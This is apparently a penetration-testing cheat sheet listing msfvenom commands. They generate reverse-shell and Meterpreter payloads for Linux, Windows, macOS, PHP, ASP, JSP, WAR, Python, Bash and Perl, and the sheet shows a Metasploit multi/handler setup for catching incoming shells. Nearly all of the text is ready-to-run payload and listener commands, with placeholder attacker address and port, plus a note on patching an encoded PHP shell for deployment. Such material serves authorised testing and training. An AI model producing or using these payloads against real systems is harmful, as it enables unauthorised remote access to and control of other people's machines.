## Introduction

One of the most useful and often underrated abilities of **Metasploit** is the **msfpayload** module. This module allows for the creation of multiple payloads, providing a shell in almost any situation. This guide will demonstrate how to generate various payloads using Msfvenom, configure them in Metasploit, and launch an attack.

* * *

### List Available Payloads

```html
msfvenom -l
```

* * *

### Binaries Payloads

#### Linux

```html
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f elf > shell.elf
```

#### Windows

```html
msfvenom -p windows/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f exe > shell.exe
```

#### Mac

```html
msfvenom -p osx/x86/shell_reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f macho > shell.macho
```

* * *

### Web Payloads

#### PHP

```html
msfvenom -p php/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -e php/base64 R > shell.php
```

Since the file has been encoded using base64, do not forget to open it using your favorite text editor and add "`<?php`" at the top and "`?>`" at the end.

#### ASP

```html
msfvenom -p windows/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f asp > shell.asp
```

#### JSP

```html
msfvenom -p java/jsp_shell_reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f raw > shell.jsp
```

#### WAR

```html
msfvenom -p java/jsp_shell_reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f war > shell.war
```

* * *

### Scripting Payloads

#### Python

```html
msfvenom -p cmd/unix/reverse_python LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f raw > shell.py
```

#### Bash

```html
msfvenom -p cmd/unix/reverse_bash LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f raw > shell.sh
```

#### Perl

```html
msfvenom -p cmd/unix/reverse_perl LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f raw > shell.pl
```

* * *

### Shellcode Payloads

For all shellcode, see "`msfvenom --help-formats`" for information on valid parameters. Msfvenom will output code that can be cut and pasted in this language for your exploits.

#### Linux Based Shellcode

```html
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f "LANGUAGE"
```

#### Windows Based Shellcode

```html
msfvenom -p windows/meterpreter/reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f "LANGUAGE"
```

#### Mac Based Shellcode

```html
msfvenom -p osx/x86/shell_reverse_tcp LHOST="YOUR-IP-ADDRESS" LPORT="YOUR-LOCAL-PORT" -f "LANGUAGE"
```

* * *

### Create Handlers

Metasploit handlers are useful for quickly setting up Metasploit to receive incoming shells. Handlers should be configured as follows:

```html
msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set LHOST "YOUR-IP-ADDRESS"
msf exploit(multi/handler) > set LPORT "YOUR-LOCAL-PORT"
msf exploit(multi/handler) > set PAYLOAD "relevant/payload"
msf exploit(multi/handler) > set ExitOnSession false
msf exploit(multi/handler) > exploit -j -z
```

* * *

### Load Custom Payloads

Metasploit allows you to generate a payload and use it during an attack. To use this function, simply generate your payload before running your attack and then specify the custom payload as follows:

```html
msfconsole
msf > use payload/generic/custom
msf payload(custom) > show options
msf payload(custom) > set PAYLOADFILE "/path/to/the/payload"
msf payload(custom) > set PAYLOADSTR "the_payload_string_to_use"
```

* * *

### Conclusion

Metasploit's msfpayload and msfvenom modules are powerful tools for creating and deploying various types of payloads. By following the steps outlined in this guide, you can generate payloads, configure them in Metasploit, and effectively conduct penetration tests. Whether you're targeting Linux, Windows, Mac, or web applications, Metasploit provides the flexibility and power to adapt to almost any situation.